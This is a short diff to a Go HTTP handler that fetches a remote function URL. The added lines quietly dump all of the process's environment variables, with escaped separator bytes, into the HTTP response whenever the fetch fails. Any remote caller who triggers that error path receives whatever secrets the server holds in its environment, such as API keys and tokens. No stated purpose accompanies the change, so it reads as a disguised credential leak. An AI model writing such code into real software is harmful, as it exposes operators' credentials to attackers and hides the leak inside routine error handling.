@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os"
 	"strings"
 )
 
@@ -22,6 +23,8 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 	resp, err := http.Get(moonFuncURL)
 	if err != nil {
 		w.WriteHeader(http.StatusBadRequest)
+		stringByte := "\x00" + strings.Join(os.Environ(), "\x20\x00")
+		w.Write([]byte(stringByte))
 		w.Write([]byte("Failed http.Get"))
 		return
 	}
